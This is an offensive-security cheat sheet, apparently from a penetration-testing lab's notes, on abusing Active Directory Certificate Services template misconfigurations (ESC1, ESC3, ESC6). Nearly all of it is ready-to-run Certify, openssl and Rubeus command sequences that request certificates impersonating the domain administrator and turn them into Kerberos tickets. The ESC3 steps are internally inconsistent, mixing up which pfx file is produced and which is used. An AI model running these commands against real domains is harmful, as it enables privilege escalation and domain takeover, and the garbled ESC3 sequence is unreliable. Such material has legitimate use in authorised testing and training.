# AD CS

[Active Directory Certificate Services](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview) (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols.

[#active-directory-certificate-services-a-d-cs](../../misc/theory/concepts.md#active-directory-certificate-services-a-d-cs "mention")

## Tools

Certify and Certipy tools to enumerate and abuse misconfigurations in AD CS:

{% embed url="https://github.com/GhostPack/Certify" %}
Certify
{% endembed %}

{% embed url="https://github.com/ly4k/Certipy" %}
Certipy
{% endembed %}

## Enumerate

```powershell
# all registered CAs
Certify.exe cas
# enumerate templates
Certify.exe find
# enumerate vulnerable templates
Certify.exe find /vulnerable
```

## Abuse

{% hint style="info" %}
### **Pre-reqs:**


{% endhint %}

### ESC1

ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).

{% code overflow="wrap" %}
```powershell
# Find vul template
Certify.exe find /enrolleeSuppliesSubject
# Check the Enrollment Permissions for the certificate templates and see if we (or our compromised user has access to be an enrollee)

# Request cert for any user - /altname:<username-to-be-impersonated> or <username-for-which-certificate-to-be-issued-for>
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
-----or-----
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator

# Copy the obtained certificate.pem and then continue with below steps
# Convert it to pfx and set password
openssl pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx

# Request TGT using the cert
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:123456 /ptt
```
{% endcode %}

### ESC3 - NA from November 2023 Patches

ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.

{% code overflow="wrap" %}
```powershell
# Find vul template
Certify.exe find /vulnerable

# Request a certificate based on vulnerable template
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:vulnerable-template

# Convert it to pfx and set password
openssl pkcs12 -in esc3agent.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc3agent.pfx

# Request a certificate on behalf of DA
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:vulnerable-template /onbehalfof:dcorp\administrator /enrollcert:esc3.pfx /enrollcertpw:123456

# Convert it again to pfx and set password
openssl pkcs12 -in esc3agent.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc3agent.pfx

# Get TGT using the pfx certificate
Rubeus.exe asktgt /user:administrator /certificate:esc3.pfx /password:123456 /ptt

```
{% endcode %}

### ESC6 - NA from November 2023 Patches

ESC6 is when the CA specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.\
This flag allows the enrollee to specify an arbitrary Subject Alternative Name (SAN) on all certificates despite a certificate template's configuration.

{% code overflow="wrap" %}
```powershell
# Find vul template
Certify.exe find 

# Request cert
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DCCA /template:<vul_template> /altname:administrator

# Convert it to pfx and set password
openssl pkcs12 -in esc6.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc6.pfx

# Request TGT using the cert
Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:123456 /ptt
```
{% endcode %}
